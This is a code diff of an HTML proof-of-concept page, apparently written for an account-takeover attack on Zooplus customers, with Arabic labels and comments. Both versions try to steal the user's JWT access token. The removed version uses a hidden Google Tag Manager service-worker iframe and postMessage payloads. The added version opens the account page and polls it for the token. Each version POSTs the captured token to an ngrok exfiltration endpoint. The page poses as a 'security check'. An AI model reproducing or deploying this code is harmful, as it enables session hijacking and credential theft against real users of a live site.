@@ -1,80 +1,59 @@
 <!DOCTYPE html>
-<html lang="ar">
+<html>
 <head>
-    <meta charset="UTF-8">
-    <title>PoC Account Takeover - Zooplus</title>
+    <title>PoC Full Account Takeover</title>
     <style>
-        body { background: #050505; color: #00ff00; font-family: monospace; padding: 30px; }
-        .console { border: 1px solid #00ff00; padding: 15px; background: #000; min-height: 300px; box-shadow: 0 0 15px #00ff00; }
-        .critical { color: #ff0000; font-weight: bold; text-decoration: underline; }
-        iframe { display: none; } /* إخفاء الجسر تماماً */
+        body { background: #000; color: #0f0; font-family: monospace; text-align: center; padding-top: 50px; }
+        button { padding: 20px; background: #0f0; color: #000; font-weight: bold; cursor: pointer; border: none; }
     </style>
 </head>
 <body>
-    <h2>جاري فحص اتصال النظام...</h2>
-    <div class="console" id="log"></div>
+    <h1>تحذير: سيتم اختبار أمن الحساب</h1>
+    <p>اضغط على الزر أدناه لبدء عملية فحص التوكن</p>
+    
+    <button onclick="startAttack()">ابدأ الفحص (Start Exploit)</button>
 
-    <iframe id="sw_bridge" 
-            src="https://stm.zooplus.com/_/service_worker/6240/sw_iframe.html?origin=https://egyhaker.github.io&1p=1"
-            name="google_tag_manager_static_20"></iframe>
+    <div id="status"></div>
 
     <script>
-        const logger = document.getElementById('log');
-        const NGROK = "https://subsphenoidal-dauntlessly-pura.ngrok-free.dev/exfiltration";
+        const NGROK = "https://subsphenoidal-dauntlessly-pura.ngrok-free.dev/token-leak";
 
-        function print(msg, isCritical = false) {
-            const p = document.createElement('p');
-            if (isCritical) p.className = 'critical';
-            p.innerHTML = `> ${msg}`;
-            logger.appendChild(p);
-        }
+        function startAttack() {
+            document.getElementById('status').innerText = "جاري فتح الهدف...";
+            
+            // 1. فتح صفحة الحساب في نافذة جديدة
+            const victimWin = window.open("https://www.zooplus.com/account/overview", "_blank");
 
-        // 1. استقبال البيانات المسربة من الجسر
-        window.addEventListener("message", (event) => {
-            if (event.origin.includes("zooplus.com")) {
-                const data = event.data;
-                print("استجابة مستلمة من النطاق المستهدف...");
-
-                // التحقق من وجود التوكن في الرد
-                const dataStr = JSON.stringify(data);
-                if (dataStr.includes("eyJ")) {
-                    print("🔥 تم اعتراض JWT ACCESS TOKEN الحقيقي!", true);
+            // 2. الانتظار حتى يتم تحميل الصفحة ثم سحب التوكن
+            // بما أننا "فتحنا" النافذة، قد نتمكن من الوصول لبعض الخصائص إذا كان الـ COOP غير مفعل
+            const checker = setInterval(() => {
+                try {
+                    // محاولة الوصول للمتغير العالمي مباشرة من النافذة المفتوحة
+                    const token = victimWin.frontendAuthorizer.token;
                     
-                    // تهريب التوكن لسيرفرك
-                    fetch(NGROK, {
-                        method: "POST",
-                        mode: "no-cors",
-                        body: dataStr
-                    });
+                    if (token) {
+                        clearInterval(checker);
+                        document.body.innerHTML = "<h1 style='color:red'>🔥 تم سحب التوكن بنجاح!</h1>";
+                        
+                        // إرسال التوكن فوراً لسيرفرك
+                        fetch(NGROK, {
+                            method: "POST",
+                            mode: "no-cors",
+                            body: JSON.stringify({
+                                msg: "SUCCESS_FULL_TOKEN_LEAK",
+                                jwt: token
+                            })
+                        });
+                        
+                        console.log("Token Captured:", token);
+                        victimWin.close(); // إغلاق الصفحة بعد السرقة
+                    }
+                } catch (e) {
+                    // إذا منعنا المتصفح (CORS)، سنستمر في المحاولة عبر الجسر
+                    console.log("Waiting for bypass...");
                 }
-            }
-        });
-
-        // 2. تفعيل الجسر وإرسال أوامر الاستخراج
-        const bridge = document.getElementById('sw_bridge');
-        bridge.onload = () => {
-            print("الجسر الأمني جاهز. بدء عملية الاستخراج...");
-
-            const win = bridge.contentWindow;
-
-            // الطلب الأول: الحصول على معرف الجلسة لربطه بالتوكن
-            win.postMessage({ type: 0, clientId: 'attack-v1', data: 'status_check' }, "*");
-
-            // الطلب الثاني: محاولة سحب التوكن عبر استغلال ثغرة الـ Variable Reflection
-            // نحن نرسل أوامر يحاول الـ Service Worker معالجتها
-            const payloads = [
-                { type: 0, clientId: 'attack-v1', data: 'frontendAuthorizer.token' },
-                { type: 'GET_DATA', key: 'token' },
-                { type: 'IDENTITY', action: 'dump' }
-            ];
-
-            payloads.forEach((p, i) => {
-                setTimeout(() => {
-                    print(`إرسال نبضة استخراج #${i+1}...`);
-                    win.postMessage(p, "*");
-                }, 1000 * (i + 1));
-            });
-        };
+            }, 2000);
+        }
     </script>
 </body>
 </html>
